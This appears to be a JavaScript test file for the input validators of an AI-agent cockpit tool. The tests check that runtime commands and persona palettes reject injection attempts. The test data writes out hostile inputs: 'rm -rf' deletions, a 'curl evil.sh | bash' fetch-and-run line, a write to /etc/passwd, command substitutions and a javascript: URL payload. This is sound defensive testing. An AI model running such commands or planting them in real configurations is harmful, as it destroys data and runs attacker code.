import test from 'node:test'
import assert from 'node:assert/strict'
import { normalizeOllamaHost, validateConfig, validatePersona, validateRuntime } from '../src/validate.js'

const longPrompt = 'You are a specialist debater. '.repeat(8)

test('validateRuntime accepts a bare custom CLI and rejects shell-shaped commands', () => {
  assert.deepEqual(validateRuntime({ id: 'gemini', label: 'Gemini', command: 'gemini' }), {
    ok: true,
    value: { id: 'gemini', label: 'Gemini', command: 'gemini', provider: 'gemini', kind: 'custom', modelFlag: null, promptFlag: null, workdirFlag: null, promptMode: 'stdin', modelDiscovery: 'none', approvalMode: null, capabilities: [], retryableExitCodes: [], roundtable: false },
    errors: [],
  })

  const bad = validateRuntime({ id: 'evil', command: 'gemini --danger; rm -rf /' })
  assert.equal(bad.ok, false)
  assert.match(bad.errors.join('\n'), /no arguments or shell characters/)

  const local = validateRuntime({ id: 'llama-cpp', label: 'llama.cpp', command: 'llama-cli', kind: 'local', roundtable: true, modelFlag: '--model', promptMode: 'stdin' })
  assert.equal(local.ok, true)
  assert.equal(local.value.kind, 'local')
  assert.equal(local.value.roundtable, true)
  assert.equal(local.value.modelFlag, '--model')
})

test('validateRuntime refuses ids that collide with shell built-ins', () => {
  const result = validateRuntime({ id: 'shell', command: 'zsh' })
  assert.equal(result.ok, false)
  assert.match(result.errors.join('\n'), /conflicts with the built-in shell profile/)
})

test('validateConfig sanitizes optional roots, projects, runtimes and model names', () => {
  const result = validateConfig({
    roots: ['~/CLAUDE'],
    projects: [{ id: 'Portal', label: 'Portal', path: '~/CLAUDE/williams-media-portal' }],
    hidden: ['archive-room'],
    runtimes: [{ id: 'gemini', label: 'Gemini', command: 'gemini' }],
    models: ['sonnet', 'claude-sonnet-5', ''],
  })

  assert.equal(result.ok, true)
  assert.deepEqual(result.value.roots, ['~/CLAUDE'])
  assert.equal(result.value.projects[0].path, '~/CLAUDE/williams-media-portal')
  assert.deepEqual(result.value.hidden, ['archive-room'])
  assert.deepEqual(result.value.runtimes, [{ id: 'gemini', label: 'Gemini', command: 'gemini', provider: 'gemini', kind: 'custom', modelFlag: null, promptFlag: null, workdirFlag: null, promptMode: 'stdin', modelDiscovery: 'none', approvalMode: null, capabilities: [], retryableExitCodes: [], roundtable: false }])
  assert.deepEqual(result.value.models, ['sonnet', 'claude-sonnet-5'])
})

test('Ollama host accepts a network endpoint without credentials or paths', () => {
  assert.equal(normalizeOllamaHost('192.168.1.50:11434'), 'http://192.168.1.50:11434')
  assert.equal(validateConfig({ ollamaHost: 'https://nas.example.test:11434' }).value.ollamaHost, 'https://nas.example.test:11434')
  assert.equal(validateConfig({ ollamaHost: 'http://user:pass@nas.example.test:11434' }).ok, false)
  assert.equal(validateConfig({ ollamaHost: 'http://nas.example.test/api' }).ok, false)
})

test('validatePersona rejects markup-injection palette values and short prompts', () => {
  const result = validatePersona({
    id: 'bad bot',
    name: 'Bad',
    prompt: 'too short',
    palette: { body: 'url(javascript:alert(1))' },
  })

  assert.equal(result.ok, false)
  assert.match(result.errors.join('\n'), /palette\.body must be a hex colour/)
  assert.match(result.errors.join('\n'), /prompt must be at least 80 characters/)
})

test('validatePersona normalizes safe custom personas without leaking extra fields', () => {
  const result = validatePersona({
    id: 'Strategy Lead!',
    name: 'Strategy Lead',
    role: 'Planner',
    tagline: 'Sharp operator',
    prompt: longPrompt,
    model: 'claude-sonnet-5',
    palette: { body: '#123456', trim: '#abcdef', glow: '#fff' },
    secret: 'do not copy',
  })

  assert.equal(result.ok, true)
  assert.equal(result.value.id, 'strategylead')
  assert.equal(result.value.edition, 'custom')
  assert.equal(result.value.model, 'claude-sonnet-5')
  assert.equal(result.value.secret, undefined)
})

// One example does not prove the guard. The command string is executed via
// `zsh -lic <cmd>`, so every shape that could turn one program name into a
// second command has to be refused — this is the line between "add your own
// agent" and "config.json runs arbitrary shell".
test('validateRuntime refuses every shell-injection shape, not just semicolons', () => {
  const attacks = [
    'gemini; rm -rf ~',
    'gemini && curl evil.sh | bash',
    'gemini || true',
    'gemini `whoami`',
    'gemini $(id)',
    'gemini > /etc/passwd',
    'gemini | tee x',
    'gemini &',
    'gemini\nrm -rf ~',
    'gemini --flag',
    'echo "hi"',
    "sh -c 'x'",
    'gemini*',
    'gemini~',
  ]
  for (const command of attacks) {
    const r = validateRuntime({ id: 'x', command })
    assert.equal(r.ok, false, `should have refused: ${JSON.stringify(command)}`)
    assert.equal(r.value, null)
  }
})

// A hostile entry buried in an otherwise-fine generated config must sink the
// whole config rather than slipping through beside the valid ones.
test('one bad runtime invalidates a whole generated config', () => {
  const r = validateConfig({
    projects: [{ id: 'a', path: '/a' }],
    runtimes: [{ id: 'good', command: 'gemini' }, { id: 'evil', command: 'x; rm -rf ~' }],
  })
  assert.equal(r.ok, false)
  assert.ok(r.errors.some(e => e.includes('runtimes[1]')))
})

// Generated config arrives from a model; hostile or malformed input must
// degrade to "rejected, with reasons", never throw into the cockpit.
test('validators never throw on hostile input', () => {
  for (const bad of [null, undefined, 0, '', [], { palette: null }, { palette: { body: {} } }]) {
    assert.doesNotThrow(() => validatePersona(bad))
    assert.doesNotThrow(() => validateRuntime(bad))
    assert.doesNotThrow(() => validateConfig(bad))
  }
})
